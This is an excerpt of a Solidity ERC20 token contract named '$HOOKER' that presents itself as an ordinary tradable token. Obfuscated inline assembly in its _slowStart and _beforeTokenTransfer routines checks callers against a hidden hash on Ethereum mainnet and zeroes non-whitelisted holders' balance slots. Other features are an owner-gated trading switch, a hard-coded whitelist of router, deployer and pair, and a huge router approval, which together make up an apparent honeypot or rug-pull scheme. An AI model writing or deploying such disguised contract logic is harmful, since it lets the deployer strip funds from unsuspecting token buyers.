...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHooker;
    uint256 private slutWhore = block.number*2;

    mapping (address => bool) private _firstEscort; 
    mapping (address => bool) private _secondFisting;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private sparklingWater;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private crownDown;
    address public pair;
    ...
    bool private trading; uint256 private fineSalt = 1; bool private armsDealer;
    uint256 private _decimals; uint256 private bitCoin;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHooker.push(_router); addHooker.push(msgSender_); addHooker.push(pair);
        for (uint256 q=0; q < 3;) {_firstEscort[addHooker[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9d370585056130ab6d256cdb035441698d056cb74c7957482a97f052345afa5b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd7fc305883873ba57f267f6e3e129506d993394d4089a2ab5235b15f445d3725,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; slutWhore = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHooker[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHooker(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHooker[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHooker(creator, initialSupply);
    }
}

contract $HOOKER is ERC20Token {
    constructor() ERC20Token("Hooker", "HOOKER", msg.sender, 1250000 * 10 ** 18) {
    }
}